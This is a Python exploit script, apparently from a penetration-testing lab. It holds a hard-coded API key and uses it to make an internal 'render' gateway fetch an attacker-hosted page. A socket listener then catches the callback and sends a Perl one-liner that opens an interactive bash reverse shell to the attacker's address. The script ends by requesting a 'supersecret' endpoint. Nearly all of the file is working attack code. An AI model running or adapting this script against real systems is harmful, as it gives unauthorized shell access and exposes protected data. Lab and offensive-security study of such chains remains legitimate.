import argparse
import json
import requests
import socket
import threading
import sys
import os
import select
import time
key = "SBzrCb94o9JOWALBvDAZLnHo3s90smjC"
target = "http://apigateway:8000/render?url=http://192.168.45.194/index2.html"

headers = {
  'apikey': key
}

proxies = {
  'http': 'http://127.0.0.1:8080'
}

class ReverseShell:
	def __init__(self, host, port, callback_function=None):
		self.host = host
		self.port = port
		self.callback_function = callback_function
		self.thread = threading.Thread(target=self.start_listener)

	def start_listener(self):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.bind((self.host, self.port))
			s.listen(1)
			print(f"Listening on {self.host}:{self.port}")
			conn, addr = s.accept()
			print("[+] Connection from {}:{}".format(*addr))
			print()

			# Get initial data
			r, _, _ = select.select([conn], [], [], 1)
			if r: conn.recv(1024)

			try:
				print("Callback")
				if self.callback_function:
					self.callback_function(conn)
				print("OK")
				conn.close()
			finally:
				print("Connection closed")
				conn.close()
				sys.exit()
		except socket.error as e:
			sys.stderr.write(f"Error: {str(e)}\n")
			print(self.host, self.port)
			print("Ensure that port is open!")
			exit(0)

	def start(self):
		self.thread.start()

LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
LPORT = 9001

def exec_command(conn, command):
	print("Exec command!")
	conn.send((command + '\n').encode())
	time.sleep(1)

	print("Getting output......")
	result = b""
	while True:
		r, _, _ = select.select([conn], [], [], 1)
		if r:
			data = conn.recv(1024)
			if len(data) == 0: 
				break
			result += data
		else:
			break
	print(result.decode())
	return

cmd = "perl -e \'use Socket;$i=\"192.168.45.194\";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};\'"
# cmd = "whoami"
print(cmd)
print()

def handle_connection(conn):
	exec_command(conn, cmd)

print("Ensure netcat listener on port 9002!")
print("Hosting temporary listener on port 9001!")
print()

server = ReverseShell(LHOST, LPORT, handle_connection)
server.start()

r = requests.get(target, headers=headers,proxies=proxies)

# with open("test.pdf", "w") as f:
#   f.write(r.text)

r = requests.get("http://apigateway:8000/supersecret")
print(r.text)
